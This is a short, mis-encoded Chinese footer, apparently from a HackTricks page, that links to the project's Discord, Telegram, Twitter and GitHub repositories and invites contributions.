* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨ Twitter ä¸Šå…³æ³¨** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
